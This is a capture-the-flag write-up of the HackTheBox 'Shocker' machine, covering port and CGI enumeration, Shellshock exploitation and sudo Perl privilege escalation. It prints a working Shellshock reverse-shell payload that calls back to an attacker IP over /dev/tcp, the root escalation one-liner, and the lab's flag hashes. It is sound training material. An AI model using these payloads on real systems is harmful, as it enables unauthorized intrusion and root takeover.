# Shocker | HackTheBox Writeup

**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-05-01

**Techniques:** Shellshock (CVE-2014-6271), CGI script enumeration, Perl sudo NOPASSWD privesc

---

## Overview

Shocker is an Easy Linux box built around CVE-2014-6271, the Shellshock vulnerability in bash. Apache serves a CGI script under `/cgi-bin/` that executes through a vulnerable bash version. Injecting a reverse shell payload through the User-Agent header triggers execution as the web user. Privilege escalation is a single sudo command. Perl is available as root with no password required.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN shocker-all-ports.txt 10.129.26.231
ports=$(grep open shocker-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN shocker-service-scan.txt 10.129.26.231
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache httpd 2.4.18 |
| 2222 | SSH | OpenSSH 7.2p2 |

### CGI Script Discovery

Initial gobuster against root returned nothing useful. `/cgi-bin/` returned 403 but targeted enumeration directly against it found the script:

```bash
gobuster dir -u http://10.129.26.231/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x sh,pl,cgi -o shocker-cgibin.txt
```

**Found:** `/cgi-bin/user.sh` (Status: 200)

Script confirmed executable via curl. Returns uptime output, confirming Apache CGI execution.

---

## Exploitation

### CVE-2014-6271: Shellshock

Apache passes HTTP headers to CGI scripts as environment variables. Vulnerable bash versions execute arbitrary code embedded in malformed function definitions within those variables.

```bash
nc -lvnp 4444
```

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.67/4444 0>&1' http://10.129.26.231/cgi-bin/user.sh
```

Shell landed as `shelly`.

---

## Privilege Escalation

### Perl NOPASSWD Sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/perl
```

```bash
sudo perl -e 'exec "/bin/bash";'
```

Root shell obtained.

---

## Flags

```bash
cat /home/shelly/user.txt
# ccf9cda31c6b0c54ce0d6b02fe535db8

cat /root/root.txt
# 2c54eb00715a10df55381bfb88ef218e
```

---

## Attack Chain

```
Nmap: Apache 2.4.18 on 80, SSH on 2222
    -> gobuster /cgi-bin/ with .sh extension
        -> /cgi-bin/user.sh found (200)
            -> Shellshock via User-Agent header
                -> Shell as shelly
                    -> sudo -l: perl NOPASSWD
                        -> sudo perl exec /bin/bash
                            -> root
```

---

## Key Takeaways

- A 403 on a directory does not mean its contents are inaccessible. Always run gobuster directly against 403 directories with relevant extensions.
- Shellshock fires through any HTTP header passed as an environment variable. User-Agent, Referer, and Cookie are all valid vectors.
- The CGI handler is the attack surface. The script content is irrelevant. What matters is that bash processes the headers before executing it.
- sudo -l is always the first privesc check. Perl, Python, Ruby with NOPASSWD as root are instant escalations via GTFOBins.

---

## Screenshots

| Step | File |
|------|------|
| Nmap all ports | `screenshots/01-nmap-all-ports.png` |
| Nmap service scan | `screenshots/02-nmap-service-scan.png` |
| Gobuster root | `screenshots/03-gobuster-root.png` |
| Gobuster cgi-bin | `screenshots/04-gobuster-cgibin.png` |
| user.sh curl output | `screenshots/05-usersh-curl.png` |
| Shellshock payload | `screenshots/06-shellshock-payload.png` |
| Shell as shelly | `screenshots/07-shell-shelly.png` |
| sudo -l output | `screenshots/08-sudo-l.png` |
| Root shell | `screenshots/09-root-shell.png` |
| User flag | `screenshots/10-user-flag.png` |
| Root flag | `screenshots/11-root-flag.png` |

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Linux Phase L1.*
